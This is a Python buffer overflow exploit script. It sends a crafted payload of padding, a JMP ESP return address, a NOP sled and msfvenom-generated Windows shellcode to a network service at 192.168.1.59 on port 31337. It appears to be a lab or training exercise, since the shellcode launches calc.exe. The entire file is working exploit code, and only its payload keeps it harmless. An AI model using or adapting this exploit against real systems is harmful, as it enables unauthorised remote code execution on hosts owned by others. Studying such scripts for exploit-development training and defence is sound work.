#!/usr/bin/python
import socket,sys
from time import sleep
ip="192.168.1.59"
port=31337
esp ="\xC3\x14\x04\x08" #JMP ESP adress in littleendian format
nops = "\x90"*16

#badchar_test = "" 			#start with empty string
#badchars = [0x00, 0x0A]			#every time bad...

#shellcode msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread

shellcode =  b""
shellcode += b"\xda\xd6\xbb\xe8\x75\xf7\xc8\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x31\x31\x5a\x18\x03\x5a\x18"
shellcode += b"\x83\xea\x14\x97\x02\x34\x0c\xda\xed\xc5\xcc"
shellcode += b"\xbb\x64\x20\xfd\xfb\x13\x20\xad\xcb\x50\x64"
shellcode += b"\x41\xa7\x35\x9d\xd2\xc5\x91\x92\x53\x63\xc4"
shellcode += b"\x9d\x64\xd8\x34\xbf\xe6\x23\x69\x1f\xd7\xeb"
shellcode += b"\x7c\x5e\x10\x11\x8c\x32\xc9\x5d\x23\xa3\x7e"
shellcode += b"\x2b\xf8\x48\xcc\xbd\x78\xac\x84\xbc\xa9\x63"
shellcode += b"\x9f\xe6\x69\x85\x4c\x93\x23\x9d\x91\x9e\xfa"
shellcode += b"\x16\x61\x54\xfd\xfe\xb8\x95\x52\x3f\x75\x64"
shellcode += b"\xaa\x07\xb1\x97\xd9\x71\xc2\x2a\xda\x45\xb9"
shellcode += b"\xf0\x6f\x5e\x19\x72\xd7\xba\x98\x57\x8e\x49"
shellcode += b"\x96\x1c\xc4\x16\xba\xa3\x09\x2d\xc6\x28\xac"
shellcode += b"\xe2\x4f\x6a\x8b\x26\x14\x28\xb2\x7f\xf0\x9f"
shellcode += b"\xcb\x60\x5b\x7f\x6e\xea\x71\x94\x03\xb1\x1f"
shellcode += b"\x6b\x91\xcf\x6d\x6b\xa9\xcf\xc1\x04\x98\x44"
shellcode += b"\x8e\x53\x25\x8f\xeb\xbc\xc7\x1a\x01\x55\x5e"
shellcode += b"\xcf\xa8\x38\x61\x25\xee\x44\xe2\xcc\x8e\xb2"
shellcode += b"\xfa\xa4\x8b\xff\xbc\x55\xe1\x90\x28\x5a\x56"
shellcode += b"\x90\x78\x39\x39\x02\xe0\x90\xdc\xa2\x83\xec"

bof = "A"*146 + esp + nops + shellcode
#shellcode length can be 844
#badchar = x00x0a
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	print "Fuzzing with "+str(len(bof))+" Characters"
	s.send(bof + '\r\n')
	s.recv(1024)
	s.close()
except:
	print "Some Error Occured"
sys.exit(0)
